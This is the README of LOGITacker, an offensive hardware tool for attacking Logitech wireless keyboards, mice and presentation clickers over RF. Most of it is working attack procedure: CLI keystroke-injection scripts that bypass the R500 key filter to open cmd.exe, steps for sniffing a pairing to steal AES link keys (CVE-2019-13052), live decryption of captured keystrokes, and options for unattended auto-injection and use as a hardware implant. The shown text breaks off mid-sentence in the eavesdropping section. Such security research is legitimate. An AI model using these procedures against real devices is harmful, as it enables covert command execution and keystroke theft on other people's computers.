# LOGITacker

**README is still under construction**

LOGITacker is a hardware tool to enumerate and test vulnerabilities of Logitech Wireless Input devices via RF.
In contrast to available tooling, it is designed as stand-alone tool. This means not only the low level RF part, 
but also the application part is running on dedicated hardware, which could provides Command Line Interface (CLI)
via USB serial connection. 

Keeping hardware from other vendors (not Logitech) out of scope, allowed further optimizations and improvements for
low level stuff like RF device discovery.

Additionally support for the following boards was addded:
- Nordic nRF52840 Dongle (pca10059)
- MakerDiary MDK Dongle
- MakerDiary MDK
- April Brother Dongle

LOGITacker covers the following Logitech vulnerabilities:

- MouseJack (plain injection)
- forced pairing
- CVE-2019-13052 (AES key sniffing from pairing)
- CVE-2019-13054 (injection with keys dumped via USB from presentation clickers)
- CVE-2019-13055 (injection with keys dumped via USB from Unifying devices)

LOGITacker does currently not cover the following Logitech:

- KeyJack
- CVE-2019-13053 (Injection without key knowledge, for receivers patched against KeyJack)

*Note: KeyJack and CVE-2019-13053 are covered by mjackit*

LOGITacker can also be used as Hardware Implant (see **USBsamurai**'s Tutorial https://medium.com/@LucaBongiorni/usbsamurai-for-dummies-4bd47abf8f87 )

# 1 feature summary

- Discovery of Logitech devices on air (optimized pseudo promiscuous mode)
- Device management (store/delete devices from/to flash, auto re-load parameters - like link encryption key - from flash
 when a stored device is discovered again)
- Passive Enumeration of discovered devices (sniffing, automatic update of device capabilities based on received RF frames)
- Active Enumeration of discovered devices (test receiver for additional valid device addresses, test for plain keystroke
injection vulnerability)
- Injection (Inject keystrokes into vulnerable devices, inject encrypted for devices with known key, bypass alpha 
character filter of receivers for newer devices - like R500 presentation clicker)
- Scripting (create/store/delete injections scripts on internal flash, auto load a script on boot, auto inject a script
on device discovery, support for DE and US keyboard layout)
- CLI (integrated help, tab completion, inline help)  
- Sniff pairing (AES link encryption keys get stored to flash, encrypted injection and live decryption of keyboard traffic
gets possible)
- Device Pairing / forced pairing: a virtual device could be paired to a Unifying dongle in pairing mode or to an 
arbitrary RF address (in order to test for the forced pairing vulnerability presented by Marc Newlin in 2016) 
- Device management on flash: Discovered devices could be stored/deleted to/from flash persistently. This comes handy if 
a device has an AES link encryption key associated. If the dongle is power-cycled and the respective device is discovered 
again, the associated data (including the AES key) is restored from flash.
- Live decryption: In passive enumeration mode, encrypted keyboard RF frames are automatically decrypted if the link
Encryption key is known (could be added manually or obtained from sniffed pairing). This could be combined nicely with 
USB pass-thorugh modes.
- *experimental* covert channel for air-gap bridging with "keystroke injectable" client agent to deploy the channel
for a Windows host with Logitech receiver (demo with receiver implanted into USB cable: https://youtu.be/79SogcYbpNA) 
- usable for pure USB keystroke injection (RubberDucky fashion), programming features are still usable
- USB pass-through: An USB serial based CLI is not the best choice, when it comes to processing of raw or decrypted RF
data. To circumvent this, LOGITacker supports the following pass-through modes:
    - USB keyboard pass-through: If enabled, received RF keyboard frames are forwarded to LOGITacker's USB keyboard 
    interface. Key presses of the currently sniffed wireless keyboard are ultimately mirrored to the host which has 
    LOGITacker connected. For encrypted keyboards, the decrypted data is forwarded (in case the AES key is known)
    - USB mouse  pass-through: Same as keyboard pass-through, but for mouse reports.
    - RAW pass-through: Beside the USB serial, USB mouse and USB keyboard interface, LOGITacker provides a raw HID 
    interface. Passing keyboard reports directly via USB isn't always a good idea (f.e. if you sniff a keyboard and
    the user presses ALT+F4). In order to allow further processing raw incoming data could be forwarded to the USB host, 
    using the raw interface (data format includes: LOGITacker working mode, channel, RSSI, device address, raw payload). 
- Automation / stand alone use: Beside devices data and scripts, several options could be stored persistently to flash. 
Those option allow to control LOGITacker's behavior at boot time. An **example set of persistent options, which could be
used for headless auto-injection** (LOGITacker could be power supplied from a battery) would look like this:
    - boot in discovery mode (detect devices on air)
    - if a device is discovered, automatically enter injection mode
    - in injection mode, load a stored default script and execute the script with default language layout
    - if the injection succeeded, return to discovery mode
    - enter injection mode not more than 5-times per discovered device
    
There are still many ToDo's. The whole project is in **experimental state**.    

# 2 Installation

## 2.1 Nordic nRF52840 Dongle (pca10059)

`nRF Connect` software by Nordic provides a `Programmer` app, which could be used to flash the firmware from this repository
to a Nordic nRF52840 dongle. After flashing the firmware, the dongle provides 4 new interfaces (USB serial, USB mouse, 
USB keyboard and USB HID raw). The serial interface could be accessed using `PuTTY` or `screen` on Linux.

Reference: "Terminal Settings" section of nRF5 SDK documentation - https://infocenter.nordicsemi.com/topic/com.nordic.infocenter.sdk5.v15.0.0/lib_cli.html#lib_cli_terminal_settings

To put the dongle into programming mode (bootloader) push the button labeled `RESET`. The red LED starts to 
"softblink" in red.

The proper file to flash with the Programmer app is `build/logitacker_pca10059.hex`.

## 2.2 MakerDiary MDK Dongle (pca10059)

`nRF Connect` software by Nordic provides a `Programmer` app, which could be used to flash the firmware from this repository
to a Nordic nRF52840 dongle. After flashing the firmware, the dongle provides 4 new interfaces (USB serial, USB mouse, 
USB keyboard and USB HID raw). The serial interface could be accessed using `PuTTY` or `screen` on Linux.

Reference: "Terminal Settings" section of nRF5 SDK documentation - https://infocenter.nordicsemi.com/topic/com.nordic.infocenter.sdk5.v15.0.0/lib_cli.html#lib_cli_terminal_settings

To put the dongle into programming mode (bootloader) follow these steps:
- disconnect the dongle from the host
- press and hold the button of the dongle
- re-connect the dongle to the host without releasing the button
- the red LED of the dongle should "softblink" to indicate bootloader mode

The proper file to flash with the Programmer app is `build/logitacker_mdk_dongle.hex`.

## 2.3 MakerDiary MDK

Thanks to DAPLink support flashing this board is really easy:

1) Connect the board to the host
2) Push the button labeled "IF BOOT / RST"
3) A mass storage with label "DAPLINK" should be detected and mounted to the host.
4) Copy the `build/logitacker_mdk.hex` file to the DAPLINK volume.
5) Wait till the green LED stops flashing, and the "DAPLINK" volume is re-mounted.
6) Push the "IF BOOT / RST" button again, in order to boot the LOGITacker firmware.

## 2.4 April Brother nRF52840 Dongle

The April Brother dongle provides a removable drive, which accepts uf2 file to program the dongle.

To program the dongle follow these steps:
- disconnect the dongle from the host
- double-click button on the dongle (through the tiny hole)
- copy logitacker_apr-dongle.uf2 to the removable drive 'NRF52BOOT'
- the dongle will restart
- remove the dongle from host
- reinsert dongle to host

The proper file to flash with the Programmer app is `build/logitacker_aprdongle.uf2`.

After flashing the firmware, the dongle provides 4 new interfaces (USB serial, USB mouse,
USB keyboard and USB HID raw). The serial interface could be accessed using `PuTTY` or `screen` on Linux.

Reference: "Terminal Settings" section of nRF5 SDK documentation - https://infocenter.nordicsemi.com/topic/com.nordic.infocenter.sdk

### 2.4.1 Remark on LED issues of aprbrother dongle 

The aprbrother dongle has LED issues, which are not caused by LOGITacker. See here for reference: https://github.com/AprilBrother/ab-hardware/issues/1

### 2.4.2 Remark on bootloader

Once LOGITacker has been flashed, double-tapping the hardware button does not start the bootloader anymore (UF2 flash mode).

1) In order to get back to the bootloader, unplug the dongle
2) Press and hold the hardware button (use something which fits the small hole)
3) Re-plug the dongle with the button still pressed
4) The blue LED should "soft blink", this indicates that the dongle is in bootloader mode again
5) Copy the intended UF2 firmware image to the volume named 'NRF52BOOT' to flash a new firmware 

# 3 Basic usage concepts

LOGITacker exposes four virtual USB devices:

- USB CDC ACM (serial port) - this port has a console connected and is used for CLI interaction
- USB mouse - used to optionally forward mouse reports (captured from RF) to the host 
- USB keyboard - used to optionally forward keyboard reports (captured from RF, decrypted if applicable) to the host 
- USB HID raw - used to optionally forward raw RF frames for further processing (usage as additional control interface planned) 

LOGITacker provides an interactive CLI interface which could be accessed using the USB CDC ACM serial port.

For details, see "Terminal Settings" section of nRF5 SDK documentation - https://infocenter.nordicsemi.com/topic/com.nordic.infocenter.sdk5.v15.0.0/lib_cli.html#lib_cli_terminal_settings

In addition to PuTTY, the terminal muxer `screen` could be used as an alternative, like this `screen /dev/ttyACM0 115200`
(/dev/ttyACM0 has to be replaced with the proper device file, representing LOGITacker's USB serial interface).
**In contrast to PuTTY, the screen tool seems not to support traversing `BACKSPACE` to `CTRL + H`. Because of this `CTRL + H`
has to be pressed to get BACKSPACE functionality** 

*Note: Makerdiary MDK exposes two USB serial ports (one belonging to CMSIS-DAP). Be sure to connect to the correct
port, which runs the CLI. The other port only outputs log messages*

## 3.1 LOGITacker's modes of operation

- **discover**: Used to find Logitech wireless devices on air aka. pseudo-promiscuous mode (default mode)
- **passive-enum**: Receives all RX traffic of the selected device address (optained in discover mode or added manually).
This is basically sniffing, but device information is updated based on received frames (f.e. if plain keyboard reports
are received, the device is flagged to allow plain keystroke injection)
- **active-enum**: Actively transmits frames for a discovered device address, in order to test if plain keystroke injection
is possible (no false positives, but detection doesn't work for devices like presentation clickers). Additionally 
active-enumeration "talks" to the receiver of a discovered device to find out other accessible RF addresses. This means
if a mouse is discovered, active-enum could possibly find an input RF address for a keyboard connected to the same 
receiver. If this keyboard address is vulnerable to plain injection, this would be detected, too (even if the actual 
keyboard is not in range).
in range.
- **inject**: This mode is used to inject keystrokes to a Logitech receiver for a given device address. If the respective 
device is stored along with a link encryption key (obtained by sniffing of pairing or manually added), keystrokes are 
injected with proper encryption. If no key is stored for the device or the device supports plain keys, keystrokes are
injected unencrypted.
- **script**: Not an actual mode, but a subset of commands used to edit, load and store scripts used in injection mode.
- **pair**: This mode has two submodes:
    - `pair sniff`: used to sniff device pairings (CVE-2019-13052)
    - `pair device`: used to pair a new device to a receiver in pairing mode (or for a dedicated RF address if the 
    respective receiver is vulnerable to "forced pairing")
    
## 3.2 Distinguish between data is stored in LOGITacker's RAM (session data) and data stored on flash (persistent)

- **devices**: Discovered devices are stored in RAM only. They could be persistently stored to flash with the `devices storage save <address>`
command and restored with `devices storage load <address>` command. Stored devices could be listed with `devices storage list`.
Storing devices comes in handy, if the device data has a link encryption key associated. Devices for which the pairing 
has been sniffed, are automatically stored to flash by default. If a device is discovered on air the first time and 
associated device data is stored on flash, it gets reloaded automatically. This means once a encryption key for a device
is obtained, it always is present and ready to use, even if LOGITacker has been power-cycled.
- **scripts**: Only a single (injection) script could be active at a given time. Of course scripts could be stored to
flash with `script store "scriptname"` and restored with `script load "scriptname"`. Stored scripts could be listed with
`script list`. To show the content of the currently active the following command is used: `script show`
- **options**: Options drive the behavior of LOGITacker. If done right, they could be used to fully automate it. Anyways,
changes to options NEVER ARE PERSISTENT, unless the `options store` command is run. Although being less convenient, this
is to reduce flash write&erase cycles (flash could not be written endlessly). Keep this in mind: options always have to
be stored manually, in order to persist a reboot of LOGITacker.

In case, saving of scripts or options to flash fails with
`LOGITACKER_SCRIPT_ENGINE: failed to write first task for script storage` or `<warning> LOGITACKER_OPTIONS: failed to find Flash Data Storage record for global options: 2` 
the flash store is corrupted and has to be rewritten. 
Issue `erase_flash` and reconnect the dongle afterwards. 

## 3.3 Scripting

Entering `script` to the CLI shows the sub-commands of the script command group. There are two kinds of commands:

Commands to edit the currently active script and commands to manage scripts on flash storage.

```
LOGITacker (discover) $ script 
script - scripting for injection
Options:
  -h, --help  :Show command help.
Subcommands:
  clear      :clear current script (injection tasks)
  undo       :delete last command from script (last injection task)
  show       :show listing of current script
  string     :append 'string' command to script, which types out the text given as parameter
  altstring  :append 'altstring' command to script, which types out the text using NUMPAD
  press      :append 'press' command to script, which creates a key combination from the given parameters
  delay      :append 'delay' command to script, delays script execution by the amount of milliseconds given as parameter
  store      :store script to flash
  load       :load script from flash
  list       :list scripts stored on flash
  remove     :delete script from flash
```

The keyboard language layout to use (at time of this writing US and DE are supported), could be selected with
`options inject language de` or `options inject language us`. Keep in mind, that in order to persist the language 
setting `options store` has to be issued.

The commands directly usable within a scripts are:

- **string**: Presses keys which should output the given string (according to selected language layout)
- **altstring**: Instead of pressing the key for the respective character, a ALT-NUMPAD combination is pressed, which
should produce the respective character. In contrast to the `string` command, this is language layout independent.
The shortcoming: This only works on Microsoft Operating Systems, but not on all input dialogs.
- **delay**: This command delays script execution by the given amount of milliseconds.
- **press**: This command interprets the given arguments as key combination and tries to create a keyboard report which
presses the given keys simultaneously. Key-arguments usable in press command are listed below:

```
RETURN, ESCAPE, TABULATOR, CAPS, PRINT, PRINTSCREEN, SCROLL, BREAK, INS, DEL, RIGHTARROW, LEFTARROW, DOWNARROW, UPARROW, 
NUM, APP, MENU, CTRL, CONTROL, SHIFT, ALT, GUI, COMMAND, WINDOWS, , NONE, ERROR_ROLLOVER, POST_FAIL, ERROR_UNDEFINED, 
A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 
ENTER, ESC, BACKSPACE, TAB, SPACE, MINUS, EQUAL, LEFTBRACE, RIGHTBRACE, BACKSLASH, HASHTILDE, SEMICOLON, APOSTROPHE, 
GRAVE, COMMA, DOT, SLASH, CAPSLOCK, F1, F2, F3, F4, F5, F6, F7, F8, F9, F10, F11, F12, SYSRQ, SCROLLLOCK, PAUSE, INSERT,
HOME, PAGEUP, DELETE, END, PAGEDOWN, RIGHT, LEFT, DOWN, UP, NUMLOCK, KPSLASH, KPASTERISK, KPMINUS, KPPLUS, KPENTER, KP1, 
KP2, KP3, KP4, KP5, KP6, KP7, KP8, KP9, KP0, KPDOT, 102ND, COMPOSE, POWER, KPEQUAL, F13, F14, F15, F16, F17, F18, F19, 
F20, F21, F22, F23, F24, OPEN, HELP, PROPS, FRONT, STOP, AGAIN, UNDO, CUT, COPY, PASTE, FIND, MUTE, VOLUMEUP, VOLUMEDOWN, 
KPCOMMA, RO, KATAKANAHIRAGANA, YEN, HENKAN, MUHENKAN, KPJPCOMMA, HANGEUL, HANJA, KATAKANA, HIRAGANA, ZENKAKUHANKAKU, 
KPLEFTPARENTHESE, KPRIGHTPARENTHESE, LEFTCTRL, LEFTSHIFT, LEFTALT, LEFTMETA, RIGHTCTRL, RIGHTSHIFT, RIGHTALT, RIGHTMETA
```

Here is a usage example, showing how to bring up a script which utilizes ALT+NUMPAD input, in order to bypass the key 
blacklisting of a Logitech R500 (does not allow keys `A` to `Z` and `GUI + r`) on a Windows 7 host:

```
LOGITacker (discover) $ script press NUMLOCK
LOGITacker (discover) $ script press GUI F1
LOGITacker (discover) $ script delay 500
LOGITacker (discover) $ script altstring "cmd.exe"
LOGITacker (discover) $ script press CTRL A
LOGITacker (discover) $ script press CTRL X
LOGITacker (discover) $ script press ALT F4
LOGITacker (discover) $ script delay 200
LOGITacker (discover) $ script press GUI
LOGITacker (discover) $ script delay 200
LOGITacker (discover) $ script press CTRL V
LOGITacker (discover) $ script press RETURN
LOGITacker (discover) $ script delay 500
LOGITacker (discover) $ script altstring "calc.exe"
LOGITacker (discover) $ script press RETURN
```

To list the script run `script show`

```
LOGITacker (discover) $ script show
script start
0001: press NUMLOCK
0002: press GUI F1
0003: delay 500
0004: altstring cmd.exe
0005: press CTRL A
0006: press CTRL X
0007: press ALT F4
0008: delay 200
0009: press GUI
0010: delay 200
0011: press CTRL V
0012: press RETURN
0013: delay 500
0014: altstring calc.exe
0015: press RETURN
script end
```

Below some notes on the script, as the approach applies in other scenarios, too :

As `GUI + r` is filtered by R500 (or results in `GUI` without the pressed `r`) only the start dialog could be opened on
the targeted Windows 7 host (not the run dialog). The start dialog accepts no characters created based on `ALT+NUMPAD`
combination (on Windows 10 it does so). In order to compensate for this, a help dialog is opened using `GUI+F1`. This
dialog allows input based on NUMPAD combos, thus `cmd.exe` could be typed out using the `altstring` command. In order
to use NUMPAD based key combinations, of course, NUMLOCK has to be turned on. This is why the first command of the script
presses the NUMLOCK key. Even if NUMLOCK was already enabled, a second run of the whole script would succeed.
The next commands:

- `CTRL+A` marks the whole "cmd.exe" string
- `CTRL+X` cuts the "cmd.exe" string (clipboard)
- `ALT+F4` close the opened help dialog
- `GUI` opens the start dialog 
- `CTRL+V` pastes the "cmd.exe" string from clipboard (as it can't be entered it directly using )
- `RETURN` execute cmd.exe
- the "calc.exe" string is, again, entered using `ALT+NUMPAD` combinations, as the cmd.exe console supports this
- `RETURN` execute calc.exe

The script could now be stored to flash, for later use with `script store "calc_win7"`. Stored scripts could be checked 
like this:

```
LOGITacker (discover) $ script list             
0001 script 'calc_win7'
```

Next a simplified version for Windows 10 could be created and stored:

First current script has to be cleared with `script clear`. Afterwards, a new script could be created.

```
LOGITacker (discover) $ script clear

LOGITacker (discover) $ script press NUMLOCK
LOGITacker (discover) $ script press GUI    
LOGITacker (discover) $ script delay 200
LOGITacker (discover) $ script altstring "cmd.exe"
LOGITacker (discover) $ script press RETURN
LOGITacker (discover) $ script delay 500
LOGITacker (discover) $ script altstring "calc.exe"
LOGITacker (discover) $ script press RETURN

LOGITacker (discover) $ script show
script start
0001: press NUMLOCK
0002: press GUI
0003: delay 200
0004: altstring cmd.exe
0005: press RETURN
0006: delay 500
0007: altstring calc.exe
0008: press RETURN
script end
```

Again, the script should be stored with `script store "calc_win10"`. The command `script list` should show bot scripts, 
now.

```
LOGITacker (discover) $ script list
0001 script 'calc_win7'
0002 script 'calc_win10'
```

The Windows 7 script could be re-loaded using `script load` like shown below:

```
LOGITacker (discover) $ script load calc_win7 
... snip...

LOGITacker (discover) $ script show 
script start
0001: press NUMLOCK
0002: press GUI F1
0003: delay 500
0004: altstring cmd.exe
0005: press CTRL A
0006: press CTRL X
0007: press ALT F4
0008: delay 200
0009: press GUI
0010: delay 200
0011: press CTRL V
0012: press RETURN
0013: delay 500
0014: altstring calc.exe
0015: press RETURN
script end
```

*Note: all commands shown so far, support tab completition.*

In order to load, for example, the Windows 7 script on every boot of LOGITacker, the respective option has to be changed
and stored persistently, like this:

``` 
LOGITacker (discover) $ options inject default-script "calc_win7"
LOGITacker (discover) $ options store 

... check result ...

LOGITacker (discover) $ options show 
stats
        boot count                              : 0

discover mode options
        action after RF address dicovery        : continue in discover mode after a device address has been discovered
        pass RF frames to USB raw HID           : off
        auto store plain injectable devices     : on

passive-enumeration mode options
        pass key reports to USB keyboard        : off
        pass mouse reports to USB mouse         : off
        pass all RF frames to USB raw HID       : off

pair-sniff mode options
        action after sniffed pairing            : start passive enumeration mode after successfully sniffed pairing
        auto store devices from sniffed pairing : on
        pass RF frames to USB raw HID           : off

inject mode options
        keyboard language layout                : de
        default script                          : 'calc_win7'
        maximum auto-injects per device         : 5
        action after successful injection       : stay in injection mode after successful injection
        action after failed injection           : stay in injection mode after failed injection
``` 
 
After re-plugging LOGITacker and opening the CLI again (power cycle / reboot), the "calc_win7" script should already be 
loaded. This could be checked with `script show`.

For Logitech devices vulnerable to plain keystroke injection (see MouseJack research for details), the script could 
directly be used. For encrypted devices, like Logitech R500 or Logitech SPOTLIGHT presentation clickers, the new script 
can not be injected, without knowing the encryption key. This is issue is covered in the next section.

## 3.4 Encrypted injection

In order to execute the example scripts agains an encrypted Logitech device, the decryption key has to be obtained.
There are two class of vulnerabilities, allow stealing those keys:

1) Sniff the pairing (or re-pairing) of the device to obtain the key (CVE-2019-13052)
2) USB based key extraction from Logitech receivers using a Texas Instruments chip (CVE-2019-13054, CVE-2019-13055)

As the details for CVE-2019-13054 / CVE-2019-13055 aren't released, yet, the key should be obtained using by sniffing
the device pairing. The scripts of the last section have been built to target wireless presentation clickers, like R500
or SPOTLIGHT. When those devices ship, they are already paired to the receiver. This is less of an issue, as an 
undocumented pairing mode could be triggered, anyways.

The following video shows the concept: https://youtu.be/MauTMsyphUE 

The pre-release version of munifying could be found here: https://github.com/mame82/munifying_pre_release

The only thing which has to be done to capture a pairing with LOGITacker and derive the link encryption key according to
CVE-2019-13052, is to issue the following command: `pair sniff run`

LOGITacker starts flashing the red LED. Once a receiver - which is set to pairing mode - is in range, the LED starts 
flashing blue. If a pairing is captured successfully, the device and associated key are not only stored in LOGITacker's
RAM, but they are automatically stored to flash.

In order to unpair and re-pair the device to the receiver, the `munifying` tool is used. Re-pairing of the device is
done, while LOGITacker is running in `pair sniff` mode.

The command `./munifying unpair` lists devices currently paired to the receiver and ask for a device to unpair.
To set the receiver back to pairing mode and re-pair the device, munifying has to be called with `./munifying pair`. 

Below is the example output of `munifying` for unpairing a R500 presenation clicker from its receiver and initiating 
pairing mode again.

```
root@who-knows:~# ./munifying unpair
Found CU0016 Dongle for R500 presentation clicker
Using dongle USB config: Configuration 1
Resetting dongle in order to release it from kernel (connected devices won't be usable)
HID++ interface: vid=046d,pid=c540,bus=3,addr=56,config=1,if=2,alt=0
HID++ interface IN endpoint: ep #3 IN (address 0x83) interrupt - undefined usage [32 bytes]
Dongle Info
-------------------------------------
	Firmware (maj.minor.build):  RQR45.00.B0002
	Bootloader (maj.minor):      02.09
	WPID:                        8808
	(likely) protocol:           0x04
	Serial:                      01:89:97:e6
	Connected devices:           1

Device Info for device index index 0
-------------------------------------
	Destination ID:              0x23
	Default report interval:     8ms
	WPID:                        407a
	Device type:                 0x04 (PRESENTER)
	Serial:                      a7:a4:a0:69
	Report types:                0000000e (Report types: keyboard mouse multimedia )
	Capabilities:                01 (not Unifying compatible, link encryption enabled)
	Usability Info:              0x0f (reserved)
	Name:                        Logi R500
	RF address:                  01:89:97:e6:23
	KeyData:                     **pre-release REDACTED**
	Key:                         **pre-release REDACTED**

Devices connected to target dongle, select device to unpair...
1) 01:89:97:e6:23 PRESENTER 'Logi R500'
choose device to unpair: 1
Remove device index 0 'Logi R500' from paired devices
USB Report type: HID++ short message, DeviceID: 0x01, SubID: DEVICE DISCONNECTION, Params: 0x02 0x00 0x00 0x00
	Device disconnected: true
USB Report type: DJ Report short, DeviceID: 0x01, DJ Type: NOTIFICATION DEVICE UNPAIRED, Params: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
USB Report type: HID++ short message, DeviceID: 0xff, SubID: SET REGISTER SHORT, Params: 0xb2 0x00 0x00 0x00
	Register address: REGISTER PAIRING
	Value: 0x00 0x00 0x00
Closing Logitech Receiver dongle...

root@who-knows:~# ./munifying pair
Found CU0016 Dongle for R500 presentation clicker
Using dongle USB config: Configuration 1
Resetting dongle in order to release it from kernel (connected devices won't be usable)
HID++ interface: vid=046d,pid=c540,bus=3,addr=56,config=1,if=2,alt=0
HID++ interface IN endpoint: ep #3 IN (address 0x83) interrupt - undefined usage [32 bytes]
Enable pairing for 60 seconds
USB Report type: HID++ short message, DeviceID: 0xff, SubID: SET REGISTER SHORT, Params: 0xb2 0x00 0x00 0x00
	Register address: REGISTER PAIRING
	Value: 0x00 0x00 0x00
... Enable pairing response (should be enabled)

Printing follow up reports ...
```

Once the receiver is in pairing mode, the red-flashing LED of LOGITacker should turn to a blue-flashing LED.
For Unifying devices, the device which should be paired has to be turned off and on again. For presentation clickers
R500 / SPOTLIGHT the two buttons used to put the clicker into Bluetooth mode have to pressed and hold.

If nothing has gone wrong, LOGITacker has captured the device address and encryption key. Afterwards, LOGITacker
changes back from "pair sniff" mode to "passive-enum" mode (default behavior). 

Here's some example output of a successful key capture:

```
<info> LOGITACKER_PROCESSOR_PAIR_SNIFF: dongle on channel 44 
<info> LOGITACKER_PROCESSOR_PAIR_SNIFF: dongle on channel 74 
<info> LOGITACKER_PROCESSOR_PAIR_SNIFF: dongle on channel 74 
<info> LOGITACKER_PROCESSOR_PAIR_SNIFF: dongle on channel 74 
<info> LOGITACKER_PROCESSOR_PAIR_SNIFF: dongle on channel 74 
<info> LOGITACKER_PROCESSOR_PAIR_SNIFF: dongle on channel 74 
<info> LOGITACKER_PROCESSOR_PAIR_SNIFF: dongle on channel 74 
<info> LOGITACKER_PROCESSOR_PAIR_SNIFF: dongle on channel 5 
<info> LOGITACKER_PROCESSOR_PAIR_SNIFF: dongle on channel 5 
<info> LOGITACKER_PROCESSOR_PAIR_SNIFF: PAIR SNIFF data received on channel 5
<info> LOGITACKER_PROCESSOR_PAIR_SNIFF:  D6 1F 01 01 89 97 E6 24|.......$
<info> LOGITACKER_PROCESSOR_PAIR_SNIFF:  08 88 08 04 01 04 01 00|........
<info> LOGITACKER_PROCESSOR_PAIR_SNIFF:  00 00 00 00 00 3D      |.....=  
<info> LOGITACKER_PROCESSOR_PAIR_SNIFF: PAIR SNIFF assigned 01:89:97:E6:24 as new sniffing address
...snip...
<info> LOGITACKER_PROCESSOR_PAIR_SNIFF:                         |        
<info> LOGITACKER_PROCESSOR_PAIR_SNIFF: PAIR SNIFF data received on channel 5
<info> LOGITACKER_PROCESSOR_PAIR_SNIFF:  00 40 03 01 BC         |.@...   
<info> LOGITACKER_PROCESSOR_PAIR_SNIFF: PAIR SNIFF data received on channel 5
<info> LOGITACKER_PROCESSOR_PAIR_SNIFF:  00 0F 06 02 03 F8 74 A7|......t.
<info> LOGITACKER_PROCESSOR_PAIR_SNIFF:  A4 2F                  |./      
<info> LOGITACKER_PAIRING_PARSER: Device name: Logi R500
<info> LOGITACKER_PAIRING_PARSER: Device RF address: 01:89:97:E6:25
<info> LOGITACKER_PAIRING_PARSER: Device serial: A7:A4:A0:69
<info> LOGITACKER_PAIRING_PARSER: Device WPID: 0x407A
<info> LOGITACKER_PAIRING_PARSER: Device report types: 0x0000000E
<info> LOGITACKER_PAIRING_PARSER: Device usability info: 0x0F
<info> LOGITACKER_PAIRING_PARSER: Dongle WPID: 0x8808
<info> LOGITACKER_PAIRING_PARSER: Device caps: 0x01
<info> LOGITACKER_PAIRING_PARSER: Device report types: 0x0000000E
<info> LOGITACKER_PAIRING_PARSER: Device raw key material:
<info> LOGITACKER_PAIRING_PARSER:  01 89 97 E6 40 7A 88 08|....@z..
<info> LOGITACKER_PAIRING_PARSER:  52 62 64 53 18 9E F8 74|RbdS...t
<info> LOGITACKER_PAIRING_PARSER: Device key:
<info> LOGITACKER_PAIRING_PARSER:  08 76 01 E6 64 68 37 F8|.v..dh7.
<info> LOGITACKER_PAIRING_PARSER:  52 88 E7 7A 9E 21 40 53|R..z.!@S
<info> LOGITACKER_FLASH: FDS_EVENT_WRITE
<info> LOGITACKER_FLASH: Record ID:     0x00CA
<info> LOGITACKER_FLASH: File ID:       0x1001
<info> LOGITACKER_FLASH: Record key:    0x1001
<info> LOGITACKER_SCRIPT_ENGINE: FDS event handler for scripting: IDLE ... ignoring event
<info> LOGITACKER_FLASH: dongle which should be stored to flash exists, updating ...
<info> LOGITACKER_SCRIPT_ENGINE: FDS event handler for scripting: IDLE ... ignoring event
<info> LOGITACKER_PROCESSOR_PAIR_SNIFF: device automatically stored to flash
<info> LOGITACKER_PROCESSOR_PAIR_SNIFF: Sniffed full pairing, moving on with passive enumeration for 01:89:97:E6:25
<info> LOGITACKER_RADIO: Channel hopping stopped
<info> LOGITACKER_PROCESSOR_PASIVE_ENUM: Entering passive enumeration mode for address 01:89:97:E6:25
... snip ...
```

When pressing keys on the - now paired - device, 
LOGITacker should not only print the encrypted reports, but a decrypted version, too (in passive-enum mode).

Here's an example for the key "RIGHT":

```
<info> LOGITACKER_PROCESSOR_PASIVE_ENUM: frame RX in passive enumeration mode (addr 01:89:97:E6:25, len: 22, ch idx 9, raw ch 32)
<info> app: Unifying RF frame: Encrypted keyboard, counter BD8A4B14                <<-- encrypted frame
<info> LOGITACKER_PROCESSOR_PASIVE_ENUM:  00 D3 1B 9B 99 17 CA 64|.......d
<info> LOGITACKER_PROCESSOR_PASIVE_ENUM:  3E 4A BD 8A 4B 14 00 00|>J..K...
<info> LOGITACKER_PROCESSOR_PASIVE_ENUM:  00 00 00 00 00 6B      |.....k  
<info> LOGITACKER_PROCESSOR_PASIVE_ENUM: Test decryption of keyboard payload:
<info> LOGITACKER_PROCESSOR_PASIVE_ENUM:  00 4F 00 00 00 00 00 C9|.O......
<info> LOGITACKER_PROCESSOR_PASIVE_ENUM: Mod: NONE
<info> LOGITACKER_PROCESSOR_PASIVE_ENUM: Key 1: HID_KEY_RIGHT                     <<-- decrypted key press "RIGHT" (only if AES key known)
<info> LOGITACKER_PROCESSOR_PASIVE_ENUM: frame RX in passive enumeration mode (addr 01:89:97:E6:25, len: 22, ch idx 9, raw ch 32)
<info> app: Unifying RF frame: Encrypted keyboard, counter BD8A4B15               <<-- encrypted frame
<info> LOGITACKER_PROCESSOR_PASIVE_ENUM:  00 D3 E4 FB CE 17 E2 95|........
<info> LOGITACKER_PROCESSOR_PASIVE_ENUM:  53 C8 BD 8A 4B 15 00 00|S...K...
<info> LOGITACKER_PROCESSOR_PASIVE_ENUM:  00 00 00 00 00 30      |.....0  
<info> LOGITACKER_PROCESSOR_PASIVE_ENUM: Test decryption of keyboard payload:
<info> LOGITACKER_PROCESSOR_PASIVE_ENUM:  00 00 00 00 00 00 00 C9|........
<info> LOGITACKER_PROCESSOR_PASIVE_ENUM: Mod: NONE                                <<-- decrypted key release (only if AES key known)
```

Additionally, the device should be listed in red with the remarks "encrypted, key ḱnown":

```
LOGITacker (passive enum) $ devices 
AE:C7:93:48:36 Logitech device, keyboard: yes (encrypted, key ḱnown), mouse: yes
```

Now everything is set, for encrypted injection (LOGITackers script engine automatically encrypts keyboard RF reports
for devices with known key).

In order to inject the "calc_win7" script (which should already be loaded), two steps are needed:

1) Select the injection target (tab completition available)
2) Execute the injection

This is done with the following commands (RF address of the device is only an example):

```
LOGITacker (passive enum) $ inject target AE:C7:93:48:36 
parameter count 2
Trying to send keystrokes using address AE:C7:93:48:36
LOGITacker (passive enum) $ inject execute 
```

Once the script has finished execution, LOGITacker changes back from "injection" mode to "discover" mode.
This behavior could be changed using the following command:

```
LOGITacker (injection) $ options inject onsuccess 
onsuccess - action after successful injection
Options:
  -h, --help  :Show command help.
Subcommands:
  continue      :stay in injection mode.
  active-enum   :enter active enumeration
  passive-enum  :enter active enumeration
  discover      :enter discover mode
LOGITacker (injection) $ options inject onsuccess continue 
LOGITacker (injection) $ options store 
```

## 3.5 Eavesdropping encrypted devices (keyboards)

The process for eavesdropping follows the same steps as described for the "encrypted injection".

The link encryption key for a device has either to be added manually (could be extracted from receivers with unrestricted
